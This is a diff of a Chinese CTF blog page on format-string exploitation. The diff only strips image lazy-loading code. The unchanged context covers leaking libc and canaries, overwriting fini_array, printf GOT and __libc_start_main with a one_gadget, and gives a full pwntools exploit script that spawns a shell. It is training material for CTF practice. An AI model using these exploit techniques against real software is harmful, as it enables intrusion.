@@ -140,7 +140,7 @@
         <div class="left">
             
                 <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
-                    <img src="/img/loading.gif" data-original="/images/favicon.png" class="w-full h-full rounded-sm">
+                    <img src="/images/favicon.png" class="w-full h-full rounded-sm">
                 </a>
             
             <a class="logo-title" href="/">
@@ -258,7 +258,7 @@
         
             <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                 <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
-                    <img src="/img/loading.gif" data-original="/images/avatar.jpg">
+                    <img src="/images/avatar.jpg">
                 </div>
                 <div class="info flex flex-col justify-between">
                     <div class="author flex items-center">
@@ -329,7 +329,7 @@
 <li>开始前可以先参考我的博客：<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/zwb2603096342/article/details/140495295?spm=1001.2014.3001.5502">BUUCTF axb_2019_fmt32 &amp; fmt64_格式化字符串泄露libc-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
 </ul>
 <p><font size="4" color="red">题目 BaseCTF week3-format_string_level2</font></p>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E6%A0%88%E4%B8%8A-x64.bmp" alt="栈上-x64"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E6%A0%88%E4%B8%8A-x64.bmp" alt="栈上-x64"></p>
 <ul>
 <li>很明显的格式化字符串漏洞，没有后门函数，需要泄露libc。</li>
 <li>偏移照惯例找就行了，这里就不展示了，<strong>偏移是6</strong>，需要注意64位和32利用格式化字符串漏洞实现任意地址读的区别：<strong>64位的地址多了许多0，所以导致不可以在payload前面填要读的地址</strong></li>
@@ -342,7 +342,7 @@
 
 
 <h2 id="2-泄露canary"><a href="#2-泄露canary" class="headerlink" title="2.泄露canary"></a>2.泄露canary</h2><p><font size="4" color="red">题目 NSSCTF 3rd ezstack:</font></p>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/capture_20240826120221017.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/capture_20240826120221017.bmp"></p>
 <ul>
 <li>可以发现很明显的格式化字符串漏洞，但是只可以利用一次，由于<strong>printf遇到\x00才会停止输出</strong>，利用这个特性，加上任意地址可读的漏洞利用，<strong>我们可以泄露出canary</strong>。</li>
 <li>难点其实在于<font size="4" color="red">找偏移</font></li>
@@ -360,12 +360,12 @@
 <h4 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h4><ul>
 <li>只有一次漏洞利用，很明显是不够的，因为修改pirntf_got 为system就需要一次漏洞利用，所以有什么方法可以使得改完printf后再回到main函数呢？其实是有的</li>
 </ul>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/capture_20240927141831603.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/capture_20240927141831603.bmp"></p>
 <ul>
 <li>可以发现执行完main函数之后会执行一个终止函数，如果我们可以改终止函数为main函数地址，那是不是就可以又再次回答main函数？答案是肯定的，此题目没有PIE。</li>
 <li>下图第一个红框就是main函数前要执行的初始化函数，而第二个红框就是main函数结束之后要执行的终止函数，我们要改的就是这个函数值</li>
 </ul>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/capture_20240927142246469.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/capture_20240927142246469.bmp"></p>
 <h4 id="EXP解释"><a href="#EXP解释" class="headerlink" title="EXP解释"></a>EXP解释</h4><p><font size="4">修改分析：</font></p>
 <ul>
 <li>fini_array -&gt; main	printf -&gt; system</li>
@@ -408,7 +408,7 @@
 <li><font size4>NSSCTF 3rd <strong>ezfmt</strong></font></li>
 </ul>
 <p>先来看看题目：</p>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E9%A2%98%E7%9B%AEida.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E9%A2%98%E7%9B%AEida.bmp"></p>
 <h4 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h4><ul>
 <li>题目很明显，给你7次利用格式化字符串漏洞的机会，让你getshell，可是我们发现<strong>buf是在bss段上面的</strong>，不同于在栈上的利用，在栈上，我们通常是<strong>修改printf_got为system地址</strong>，然后通过传入&#x2F;bin&#x2F;sh,达到getshell的目的，可是此处，我们不可以。</li>
 <li>为什么？因为非栈上的格式化字符串漏洞的利用需要我们自己去手动写payload，不像非栈上有fmtstr_payload这种工具帮我们修改，因此，我们手搓修改就要一直用到格式化字符串漏洞，那么这个printf就无法更改，那我们可以修改什么呢?</li>
@@ -428,7 +428,7 @@
 <h4 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h4><ul>
 <li>先查看栈结构，找到 a-&gt;b-&gt;c的结构，锁定修改的目标：</li>
 </ul>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/capture_20240825183747991.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/capture_20240825183747991.bmp"></p>
 <p>如图，为了修改__libc_start_main，我们选定的结构是下面画框部分，可以发现画框部分的地址，与libc_start_main前面的地址相差不大，我们就成功地找到了”朋友”</p>
 <p><font color="red"> D - &gt; __libc_start_main</font></p>
 <p><font color="red"> A -&gt; B -&gt; C ，修改C为D</font></p>
@@ -436,7 +436,7 @@
 <ul>
 <li>接下来对B而言，刚好也是一个a-&gt;b-&gt;c的结构，<font color="red"><strong>B-&gt;D-&gt;libc_start_main</strong>,如此我们修改B即修改第三个指针libc_start_main为onegadget即可getshell</font></li>
 </ul>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/capture_20240825184307134.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/capture_20240825184307134.bmp"></p>
 <h4 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node8.anna.nssctf.cn&quot;,28175)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/ctfpwn/exp/libc/libc6_2.31-0ubuntu9.10_amd64.so&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露libc基地址和一个stack地址</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%9$p%11$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_start_main= <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">243</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+] libc_start_main:&quot;</span>,<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line"><span class="comment">#libc = LibcSearcher(&#x27;__libc_start_main&#x27;,libc_start_main)</span></span><br><span class="line">base = libc_start_main - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+] stack = &quot;</span>, <span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">stack1 = stack - <span class="number">240</span> <span class="comment"># stack1 -&gt; libc_start_main</span></span><br><span class="line">stack2 = stack - <span class="number">224</span> <span class="comment"># stack2 -&gt; stack</span></span><br><span class="line">one = base + <span class="number">0xe3b01</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+] stack1 = &quot;</span>, <span class="built_in">hex</span>(stack1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+] stack2 = &quot;</span>, <span class="built_in">hex</span>(stack2))</span><br><span class="line"></span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack1&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack2)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>) </span><br><span class="line">p.sendline(pay)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"></span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(one&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%39$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"> </span><br><span class="line">stack1+=<span class="number">2</span></span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack1&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack2+<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"> </span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(one&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%39$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack+<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"> </span><br><span class="line">stack1+=<span class="number">2</span></span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack1&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack2+<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"> </span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(one&gt;&gt;<span class="number">32</span>).encode()+<span class="string">b&#x27;c%39$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack+<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
 
 <p>libc版本是泄露libc_start_main后上网站找的：<a class="link" target="_blank" rel="noopener" href="https://libc.rip/">libc-database <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
@@ -737,7 +737,7 @@
     </div>
 
     <div class="image-viewer-container">
-    /img/loading.gif" data-original="<img src="">
+    <img src="">
 </div>
 
 
@@ -864,18 +864,5 @@
 
 
 
-
-        <style>
-            [bg-lazy] {
-                background-image: none !important;
-                background-color: #eee !important;
-            }
-        </style>
-        <script>
-            window.imageLazyLoadSetting = {
-                isSPA: false,
-                preloadRatio: 1,
-                processImages: null,
-            };
-        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body>
+</body>
 </html>
